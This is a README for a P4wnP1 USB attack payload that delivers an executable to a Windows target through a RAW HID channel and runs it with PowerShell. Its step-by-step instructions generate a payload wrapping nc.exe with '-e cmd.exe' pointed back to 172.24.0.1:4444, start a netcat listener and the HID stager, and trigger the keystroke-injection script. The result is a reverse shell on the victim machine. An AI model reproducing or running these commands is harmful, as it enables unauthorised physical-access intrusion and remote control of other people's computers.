# Deliver and Execute

## Description

Use P4wnP1 RAW HID channel to deliver and execute an Executable file using poershell

The **DeliverAndExec.py** Takes an Executable file, convert it to base64 and creates the powershell payload **Stage2.ps1** which will be delivered to the target machine via P4wnP1 RAW HID channel.

## DEMO

![](https://raw.githubusercontent.com/NightRang3r/P4wnP1-A.L.O.A.-Payloads/master/RAW%20HID%20Attacks/DeliverAndExecute/deliver.gif)

## Instructions (NETCAT Example)

- Using the P4wnP1 web interface set P4wnP1 as Keyboard and RAW HID
- SSH to P4wnP1 AP IP address
- Copy DeliverAndExec.sh to `/usr/local/P4wnP1/scripts/`
- Copy DeliverAndExec.py to `/usr/local/P4wnP1/legacy/`
- Copy DeliverAndExec.js to `/usr/local/P4wnP1/HIDScripts/`
- Generate a payload: `python2 DeliverAndExec.py /usr/share/windows-binaries/nc.exe out.exe "172.24.0.1 4444 -e cmd.exe"`
- Make sure the **Stage2.ps1** file is in the `/usr/local/P4wnP1/legacy/` directory
- Start the RAW HID Listener nad netcat listener

  - You can use the **DeliverAndExec.sh** which will start the RAW HID listener, netcat listener and execute theDeliverAndExec.js hidscript (made for the netcat example) or do it manually:
  - `hidraw=$(P4wnP1_cli usb get device raw)`
  - `python2 /usr/local/P4wnP1/legacy/hidstager.py -s -i  /usr/local/P4wnP1/legacy/Stage2.ps1 -o $hidraw &`
  - `netcat -lvp 4444`

- Using the P4wnP1 web interface Execute the **DeliverAndExec.js** HIDscript
